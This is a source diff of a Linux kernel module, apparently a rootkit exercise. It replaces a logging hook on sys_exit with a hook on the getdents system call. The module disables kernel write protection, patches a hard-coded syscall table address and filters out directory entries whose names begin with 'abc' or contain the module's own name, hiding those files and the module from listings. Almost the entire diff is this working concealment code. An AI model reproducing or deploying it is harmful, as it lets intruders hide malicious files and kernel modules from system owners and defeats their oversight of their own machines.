@@ -5,116 +5,160 @@
 #include <linux/semaphore.h>
 #include <linux/moduleparam.h>
 #include <linux/unistd.h>
-//#include <asm/semaphore.h>
 #include <asm/cacheflush.h>
-
-//#include <sys/syscall.h>
+#include <linux/kallsyms.h>
+#include <asm/special_insns.h>
+#include <linux/string.h>
+#include <linux/fs.h>
 
 MODULE_AUTHOR("Abikamet Nathan");
 MODULE_LICENSE("GPL");
 
-#define SYS_EXIT_GROUP_ENTRY 60
+#define SYS_ENTRY 78 
 #define DISABLE (write_cr0(read_cr0() & (~ 0x10000)))
 #define ENABLE (write_cr0(read_cr0() | (0x10000)))
-//extern void *sys_call_table[];
+#define HIDE_PREFIX "abc"
+#define MODULE_NAME "syscall_intercept"
+#define HIDE_PREFIX_SZ (sizeof(HIDE_PREFIX)-1)
+
 //SYSCALL INTERCEPT:
 int level;
+typedef struct linux_dirent {
+	unsigned long d_ino;
+	unsigned long d_off;
+	unsigned long d_reclen;
+	char d_name [128];
+}Dirent;
 
 void **sys_call_table; 
-asmlinkage long (*original_sys_exit)(int);
-/*
-int make_rw(unsigned long add)
-{
-	printk("SYSCALL INTERCEPT:KERN_ALERT before set_memory_rw in make_rw");
-	//set_memory_rw ((long unsigned int)sys_call_table,1);
-	pte_t *pte = lookup_address(add, &level);
-	if(pte->pte &~ _PAGE_RW)
-		pte->pte |= _PAGE_RW;
-	return 0;
+asmlinkage long (*original_getdents) (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
+
+
+// our new getdents handler
+asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
+        int boff;
+        struct linux_dirent* ent;
+        long ret = original_getdents(fd, dirent, count);
+        printk("root_kit_ref : sys_getdents_new :  number of bytes returned by getdents() : %ld\n",ret);
+        //long ret = original_getdents(fd, dirent, count);
+        char* dbuf;
+        int dir_number=1;
+        if (ret <= 0) {
+                return ret;
+        }   
+        dbuf = (char*)dirent;
+        // go through the entries, looking for one that has our prefix
+        for (boff = 0; boff < ret;) {
+                ent = (struct linux_dirent*)(dbuf + boff);
+                printk("root_kit_ref : sys_getdents_new : size of dirent struct no %d: %ld\n",dir_number,ent->d_reclen);
+                if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) // if it has the hide prefix
+                        || (strstr(ent->d_name, MODULE_NAME) != NULL)) {     // or if it has the module name anywhere in it
+                        // remove this entry by copying everything after it forward
+                        printk("root_kit_ref : sys_getdents_new : if block : dirent char contents : %s\n",ent->d_name);
+                        memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
+                        // and adjust the length reported
+                       dir_number++;
+                        ret -= ent->d_reclen;
+                } else {
+                        // on to the next entry
+                        printk("root_kit_ref : sys_getdents_new : else block : dirent char contents : %s\n",ent->d_name);
+                        boff += ent->d_reclen;
+                        dir_number++;
+                }   
+        }   
+        return ret;
 }
 
-int make_ro(unsigned long address)
+
+asmlinkage long our_fake_getdents_function(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
-	printk("SYSCALL INTERCEPT:KERN_ALERT before set_memory_ro in make_ro");
-	//set_memory_ro ((long unsigned int)sys_call_table,1);
-	 
-	pte_t *pte = lookup_address(address, &level);
-	pte->pte = pte->pte &~ _PAGE_RW;
-	return 0;
-}
-*/
-asmlinkage long our_fake_exit_function(int error_code)
-{
+
+
+#if 0 
 	/*print message on console every time we
 	*are called*/
-	printk("SYSCALL INTERCEPT:HEY! this is Abikametkamets custom exit call sys_exit called with error_code=%d\n",
-	error_code);
+	//printk("GETDENTS INTERCEPTED!!\n");
+  	struct linux_dirent *dirent;
+	long ret = original_getdents(fd, dirp, count);	
+	char* dirent_buffer;
+	int dir_offset=0;
+	if(ret <= 0){
+		return ret;
+	}		
 	/*call the original sys_exit*/
-	return original_sys_exit(error_code);
+	dirent_buffer = (char *)dirp;
+	for(dir_offset=0;dir_offset<ret;){
+		dirent = (struct linux_dirent *)(dirent_buffer+dir_offset);
+
+		if ((strncmp(dirent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) || (strstr(dirent->d_name, MODULE_NAME) != NULL)) {
+			printk("Inside if strncmp block\n");
+			memcpy(dirent_buffer + dir_offset, dirent_buffer + dir_offset + dirent->d_reclen, ret - (dir_offset + dirent->d_reclen));
+			ret -= dirent->d_reclen;
+		} else {
+			// on to the next entry
+
+			dir_offset += dirent->d_reclen;
+			printk("Inside else strncmp block dirent_char:%s\n",dirent->d_name);
+		}
+
+	}
+#else
+
+ int boff;
+        struct linux_dirent* ent;
+        long ret = original_getdents(fd, dirp, count);
+        printk("root_kit_ref : sys_getdents_new :  number of bytes returned by getdents() : %ld\n",ret);
+        //long ret = original_getdents(fd, dirent, count);
+        char *dbuf;
+        int dir_number=1;
+        if (ret <= 0) {
+                return ret;
+        }   
+        dbuf = (char*)dirp;
+        // go through the entries, looking for one that has our prefix
+        for (boff = 0; boff < ret;) {
+                ent = (struct linux_dirent*)(dbuf + boff);
+                printk("root_kit_ref : sys_getdents_new : size of dirent struct no %d: %ld\n",dir_number,ent->d_reclen);
+                if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) // if it has the hide prefix
+                        || (strstr(ent->d_name, MODULE_NAME) != NULL)) {     // or if it has the module name anywhere in it
+                        // remove this entry by copying everything after it forward
+                        printk("root_kit_ref : sys_getdents_new : if block : dirent char contents : %s\n",ent->d_name);
+                        memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
+                        // and adjust the length reported
+                        dir_number++;
+                        ret -= ent->d_reclen;
+                } else {
+                        // on to the next entry
+                        printk("root_kit_ref : sys_getdents_new : else block : dirent char contents : %s\n",ent->d_name);
+                        boff += ent->d_reclen;
+                        dir_number++;
+                }   
+        }   
+
+
+#endif
+	return ret;
 }
-
-// int init_module()
-// {
-// 		make_rw(sys_call_table);
-
-// 	/*store reference to the original sys_exit*/
-// 	original_sys_exit=sys_call_table[__NR_exit];
-// 	manipulate sys_call_table to call our
-// 	fake exit function instead of sys_exit
-// 	sys_call_table[__NR_exit]=our_fake_exit_function;
-// 	return 0;
-// }
-
 
 static int __init begin_module(void)
 {
-	//printk("SYSCALL INTERCEPT:Before make_rw:\n");
-	sys_call_table = (void**)0xffffffff81e00240;
+	printk(KERN_INFO "************************************MODULE LOAD*************************************");
+	sys_call_table = (void**)0xffffffff81a001c0;
 	DISABLE;
-	//make_rw((void*)sys_call_table);
-	/*store reference to the original sys_exit*/
-	//printk("SYSCALL INTERCEPT:Before original_sys_exit:\n");
-
-	original_sys_exit=((void**)sys_call_table)[SYS_EXIT_GROUP_ENTRY];
-	//printk("original sys exit address:%p",original_sys_exit);
-	//printk("SYSCALL INTERCEPT:Before sys_call_table:\n");
-
-	sys_call_table[SYS_EXIT_GROUP_ENTRY] = (void*)&our_fake_exit_function;
-	//printk("our fake sys exit address:%p", our_fake_exit_function);
-	//printk("syscall exit call entry value:%p",*(sys_call_table + SYS_EXIT_GROUP_ENTRY));
-	//printk("SYSCALL INTERCEPT:Before make_ro:\n");
+	original_getdents=(sys_call_table)[SYS_ENTRY];
+	sys_call_table[SYS_ENTRY] = (void*)&sys_getdents_new;
 	ENABLE;
-	//make_ro((void*)sys_call_table);
 	return 0;
 }
 
-static void exit_module(void)
+static void __exit exit_module(void)
 {
 	DISABLE;
-	//make_rw((unsigned long)sys_call_table);
-	sys_call_table[SYS_EXIT_GROUP_ENTRY] =(void*) original_sys_exit;
-	//make_ro((unsigned long)sys_call_table);
+	sys_call_table[SYS_ENTRY] =(void*)original_getdents;
+	printk(KERN_INFO "************************************MODULE UNLOAD*************************************");
 	ENABLE;
 }
-
 
 module_init(begin_module);
 module_exit(exit_module);
 
-/*int set_page_rw(long unsigned int _addr)
-{
-    return set_memory_rw(_addr, 1);
-}
-
-int set_page_ro(long unsigned int _addr)
-{
-    return set_memory_ro(_addr, 1);
-}*/
-
-// void cleanup_module()
-// {
-// 	make __NR_exit point to the original
-// 	sys_exit when our module is unloaded
-// 	sys_call_table[__NR_exit]=original_sys_exit;
-// 	return;
-// }
